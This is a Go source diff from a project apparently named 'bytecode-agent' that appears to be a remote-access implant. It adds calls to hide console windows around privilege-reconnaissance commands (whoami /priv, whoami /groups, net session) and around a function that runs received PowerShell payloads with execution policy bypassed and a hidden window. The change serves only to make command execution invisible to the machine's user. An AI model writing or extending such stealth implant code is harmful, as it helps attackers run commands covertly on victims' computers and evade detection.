@@ -7,6 +7,8 @@ import (
 	"os/user"
 	"runtime"
 	"strings"
+
+	"bytecode-agent/internal/windows"
 )
 
 // getPrivileges enumerates current user privileges and context
@@ -30,20 +32,26 @@ func getPrivileges() (string, error) {
 	if runtime.GOOS == "windows" {
 		// whoami /all
 		sb.WriteString("\n--- whoami /priv ---\n")
-		out, err := exec.Command("whoami", "/priv").CombinedOutput()
+		cmd := exec.Command("whoami", "/priv")
+		windows.HideConsole(cmd)
+		out, err := cmd.CombinedOutput()
 		if err == nil {
 			sb.WriteString(string(out))
 		}
 
 		sb.WriteString("\n--- whoami /groups ---\n")
-		out, err = exec.Command("whoami", "/groups").CombinedOutput()
+		cmd = exec.Command("whoami", "/groups")
+		windows.HideConsole(cmd)
+		out, err = cmd.CombinedOutput()
 		if err == nil {
 			sb.WriteString(string(out))
 		}
 
 		// Check admin
 		sb.WriteString("\n--- Admin Check ---\n")
-		out, err = exec.Command("net", "session").CombinedOutput()
+		cmd = exec.Command("net", "session")
+		windows.HideConsole(cmd)
+		out, err = cmd.CombinedOutput()
 		if err == nil {
 			sb.WriteString("Running as ADMINISTRATOR (elevated)\n")
 		} else {
@@ -96,6 +104,7 @@ func executePowerShell(payload interface{}) (string, error) {
 
 	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive",
 		"-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", cmdStr)
+	windows.HideConsole(cmd)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return string(out), fmt.Errorf("powershell failed: %w", err)
